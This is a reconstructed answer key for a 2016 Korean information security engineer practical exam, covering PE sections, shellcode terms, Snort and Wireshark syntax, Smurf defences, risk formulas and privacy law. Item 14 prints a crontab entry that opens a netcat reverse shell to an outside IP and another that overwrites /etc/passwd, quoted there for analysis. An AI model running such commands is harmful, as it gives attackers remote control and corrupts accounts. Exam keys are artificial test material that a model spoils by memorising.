---
title: 정보보안기사 실기 7회 2016년 1회 실기 복원
page_type: dataset
tags:
- information-security
- certification
- exam-reconstruction
date_created: '2026-07-03'
date_updated: '2026-07-18'
source_paths:
- raw/sources/clipping/029b1bfa6da76b542fa0381adc0635dfc0d009774dd12003b16974634a525666/84b0c6271c1f63d8d3fb75ea784d2cba446dad95670e7318ce6ad28e5dafc628/manifest.json
summary: 정보보안기사 실기 7회 복원 항목을 Tistory 원문 답안 블록 기준으로 정리한 페이지.
---

## Overview




# 정보보안기사 실기 7회 2016년 1회 실기 복원

### Scope
- Exam mapping: 2016년 1회 실기.
- Source status: Information Security Tistory direct reconstruction post; confidence: medium-high.
- This file stores paraphrased reconstruction notes and answer keys, not verbatim official exam text.
- Local 1~28회 thodi-lab/blog-source PDF compilation was unlocked and text-extracted on 2026-07-06; KCA official wording is still not claimed.

### Reconstruction
| no | type | reconstructed prompt | answer | verification |
|---:|---|---|---|---|
| 1 | short | 윈도우 PE 파일 섹션의 빈칸을 채우시오. (A): 실행 코드(기계어)가 저장되는 섹션. (B): 전역 변수, 상수 등의 데이터 정보가 저장되는 섹션. (C): DLL에서 가져온 함수 정보(임포트 테이블)가 저장되는 섹션. | A : .text B : .data C : .idata | source-derived from Information Security Tistory; prompt descriptions restored |
| 2 | essay | 익스플로잇 관련 용어의 빈칸 (A), (B), (C)를 채우시오.<br>(A) 실제 기계어로 구성되어 익스플로잇 본체에 해당하는 프로그램 명칭<br>(B) x86 계열 NOP(No Operation) 코드를 16진수(hex)로 표현한 값<br>(C) ESP 레지스터에 든 값을 실행 주소로 사용하도록 EIP의 실행 흐름을 옮기는 x86 어셈블리 명령 | (A) 쉘코드(Shellcode)<br>(B) `0x90`<br>(C) `JMP ESP` | source-derived from Information Security Tistory; 2026-07-18 prompt-format and terminology correction cross-checked against the original reconstruction. `JMP ESP` transfers control to the address held in ESP; `jmp eip esp` is not a valid x86 instruction. Exact KCA wording unavailable. |
| 3 | short | 윈도우 DNS 서버 설정의 빈칸을 채우시오. (A): DNS 이름 공간과 권한 범위를 관리하는 설정. (B): DNS 서버에 이름·주소·서비스 정보를 입력하는 설정. | A : Zone 설정 B : 리소스 레코드 설정 | source-derived from Information Security Tistory; 2026-07-16 wording correction: a zone is not simply a DNS server registration |
| 4 | short | Snort 룰에서 패킷 페이로드의 10번째 바이트부터 2바이트 범위(10~11번째 바이트)에서 `FFFF` 바이트를 탐지한다. 다음 룰의 빈칸을 채우시오.<br>{{code:snort}}alert tcp any any -> any any ( (A):"\|FFFF\|"; (B):9; (C):2){{/code}} | A : content B : offset C : depth | source-derived from Information Security Tistory; 2026-07-16 technical correction: offset is zero-based and depth 2 limits the search window to two bytes |
| 5 | short | 악성코드 명칭의 빈칸을 채우시오. (A): 사용자가 인식하지 못하게 악성코드를 시스템에 설치·전달하는 프로그램. (B): 다른 프로세스의 메모리에 코드를 주입해 실행 흐름을 악용하는 기법 또는 악성코드. | A : 드롭퍼(Dropper) B : 인젝터(Injector) | source-derived from Information Security Tistory; 2026-07-16 technical correction: injector is not inherently a memory-resident subtype of dropper |
| 6 | short | 와이어샤크(Wireshark)에서 DNS 응답(Response) 패킷만 출력하는 필터 표현식을 쓰시오. | dns.flags.response == 1 또는 dns.response_to | source-derived from Information Security Tistory; answer block present |
| 7 | short | 공격자가 원격에서 웹 서버 명령을 수행할 수 있는 스크립트 파일을 업로드해 관리자 권한 획득, 소스코드 열람, 파일 조작, 백도어 설치 등을 수행하는 공격의 명칭을 쓰시오. | WebShell(웹쉘) | source-derived from Information Security Tistory; answer block present |
| 8 | short | APT 공격의 정찰·무기화·배달·취약점 공격·설치·명령 및 제어·표적 행동 단계를 분석해 취약한 절차에 선제 대응하는 록히드마틴사의 대응 방법론 명칭을 쓰시오. | 사이버 킬 체인(Cyber Kill Chain) | source-derived from Information Security Tistory; answer block present |
| 9 | short | 통제 시점에 따른 분류의 빈칸을 채우시오. (A): 발생 가능한 잠재적 문제를 식별해 사전에 대처하는 통제. (B): 예방 통제를 우회해 발생되는 문제점을 찾아내기 위한 통제. (C): 탐지된 위협에 대처하거나 피해를 줄이는 통제. | A : 예방 통제 B : 탐지 통제 C : 교정 통제(시정 통제) | source-derived from Information Security Tistory; prompt descriptions restored |
| 10 | short | 개인정보의 안전한 취급을 위해 개인정보 보호 조직 구성, 개인정보취급자 교육, 개인정보 보호 조치 등을 규정하고 내부 의사결정 절차로 수립·시행하는 내부 기준의 명칭을 쓰시오. | 내부관리계획 | source-derived from Information Security Tistory; answer block present |
| 11 | essay | 스머프(Smurf) 공격에 관하여 다음을 서술하시오.<br>(A) 출발지 IP 위조·브로드캐스트·ICMP Echo Reply가 연결되는 공격 원리<br>(B) 라우터와 호스트에서 각각 적용할 대응 조치 | (A) 공격자는 출발지 IP를 공격 대상 호스트의 IP로 위조한 ICMP Echo Request 패킷을 증폭 네트워크의 브로드캐스트 주소로 전송한다. 근처의 호스트들이 위조된 출발지 IP(공격 대상)로 다량의 ICMP Echo Reply를 전송하여 공격 대상에게 서비스 거부를 유발한다.<br>(B) 라우터에서 외부 네트워크로부터 들어오는 IP Directed Broadcast 패킷을 차단한다(`no ip directed-broadcast`). 호스트는 IP 브로드캐스트 주소로 전송된 ICMP Echo Request 패킷에 응답하지 않도록 설정한다. | source-derived from Information Security Tistory; 2026-07-18 prompt-format correction: attack principle and two defense scopes are explicitly mapped; exact official wording unavailable |
| 12 | essay | 위험 분석 관련 수치에 답하시오. (1) SLE의 의미, (2) SLE 계산식, (3) 연간 발생률 용어, (4) 보안 투자 비용을 `X`라고 할 때 ROI 판단식을 쓰시오. | (1) SLE(단일 손실 예상액) : 위협이 한 번 발생했을 때 예상되는 손실 금액이다. (2) SLE = AV(자산 가치) × EF(노출 계수) (3) ARO(Annual Rate of Occurrence, 연간 발생률) (4) 보호대책 적용 전후 ALE 차이를 편익으로 두면 ROI(%) = `(ALE_before - ALE_after - X) / X × 100`이다. `ALE - X`는 잔여 ALE가 0이라고 가정한 순편익이지 일반적인 ROI 비율식은 아니다. | source-derived from Information Security Tistory; 2026-07-17 technical correction: image-only reconstruction had labeled net benefit as ROI |
| 13 | short | 정보통신망 이용촉진 및 정보보호 등에 관한 법률에 따라 개인정보 유출 사실을 알았을 때 이용자에게 지체 없이 알려야 하는 사항 5가지를 쓰시오. | (1) 유출된 개인정보 항목 (2) 유출이 발생한 시점 (3) 이용자가 취할 수 있는 조치 (4) 정보통신서비스 제공자 등의 대응 조치 (5) 신고 접수를 할 수 있는 담당 부서 및 연락처 | source-derived from Information Security Tistory; answer block present |
| 14 | essay | 다음 crontab 항목 2개를 분석하시오.<br>{{code:cron}}(1) 0 * * * * /bin/cp /tmp/passwd1 /etc/passwd\n(2) 0 0 12 * * root /usr/bin/nc 10.10.10.10 80 -e /bin/bash{{/code}}<br>각 동작과 보안상 의미를 서술하시오. | (1) 매시 0분에 해당 사용자 crontab의 실행 권한으로 `/tmp/passwd1`을 `/etc/passwd`에 복사한다. 충분한 권한으로 실행되어 성공하면 계정 정보를 덮어쓸 수 있다. 다섯 필드 항목만으로 root 실행이라고 단정할 수 없다. (2) 매월 12일 0시 0분에 root로 `10.10.10.10:80`에 접속해 `/bin/bash`를 연결하는 명령이다. 성공하면 원격 명령 실행에 악용될 수 있으므로 외부 연결·crontab 소유자·실행 파일을 조사한다. | PDF compilation cross-check restored both cron expressions; the first expression is hourly, not monthly. This is a non-official blog compilation, not KCA wording. |
| 15 | essay | 다음 HTTP 관찰 정보를 보고 판단을 각각 서술하시오.<br>{{reference}}Source port 443 -> Destination port 80\nGET /login.php HTTP/1.1\nCookie\nPragma: no-cache\nCache-Control: must-revalidate\nid=admin&password=1234&act=login{{/reference}}<br>(1) `must-revalidate`의 의미와 이 헤더만으로 단정할 수 없는 사항<br>(2) 요청이 실제 HTTP 평문 구간에서 관찰된 경우의 보안 위험<br>(3) 출발지 포트 443으로 TLS 사용 여부를 단정할 수 없는 이유와 추가 확인 대상 | (1) `must-revalidate`는 stale 응답을 재검증하게 하는 **응답** 지시자이며, 그 값만으로 캐시를 쓰지 않거나 서버 부하가 증가한다고 단정할 수 없다.<br>(2) 패킷이 실제 HTTP 평문 구간에서 관찰됐다면 요청 파라미터와 쿠키 노출로 도청·세션 탈취 위험이 있다.<br>(3) 출발지 포트 443은 클라이언트 임시 포트일 수 있으므로, 포트 번호만으로 HTTPS에서 HTTP로 전환됐다고 판단할 수 없다. TLS 사용 여부는 실제 TLS 레코드·서버 설정으로 확인한다. | source-derived from Information Security Tistory; 2026-07-18 prompt-format correction preserves the 2026-07-17 cache semantics and source-port inference boundary; exact official wording unavailable |
| 16 | essay | Bash 쉘 취약점에 대해 답하시오.<br>(A) 취약점 명칭<br>(B) Bash 함수 선언 기능과 환경 변수를 이용한 취약점 원인<br>(C) 공격자가 대기 포트를 열고 피해 서버가 공격자 서버로 접속하도록 유도해 수립하는 쉘 연결 행위 | (A) ShellShock(쉘 쇼크)<br>(B) Bash 쉘이 제공하는 함수 선언 기능에서 취약점이 발견되었다. 환경 변수에 함수 정의 형태로 임의의 명령어를 삽입하면 Bash 실행 시 해당 명령어가 함께 실행되는 구조적 결함이 원인이다.<br>(C) 공격자는 자신의 서버에 포트를 열어 대기하고, 피해자 서버에서 공격자 서버로 접속하도록 유도하여 리버스 쉘(Reverse Shell) 연결을 수립하는 행위이다. | source image unavailable; 2026-07-18 prompt-format correction maps the reconstructed answer block without claiming official KCA wording |

### Verification Notes
- Cross-check basis: the round-specific Tistory post linked in `source_paths` was parsed by sequential question number and answer marker.
- Exact official KCA/KISA practical question wording is not available in this workspace.
- Legal/regulatory answers should be checked against current statutes before memorization.

## Schema / Composition

## Usage

## Limitations / Biases

## Claims

| id | primary | claim | status | evidence | notes |
|---|---|---|---|---|---|


## Relations

| type | target | notes |
|---|---|---|


## Sources

- `raw/sources/clipping/029b1bfa6da76b542fa0381adc0635dfc0d009774dd12003b16974634a525666/84b0c6271c1f63d8d3fb75ea784d2cba446dad95670e7318ce6ad28e5dafc628/manifest.json`
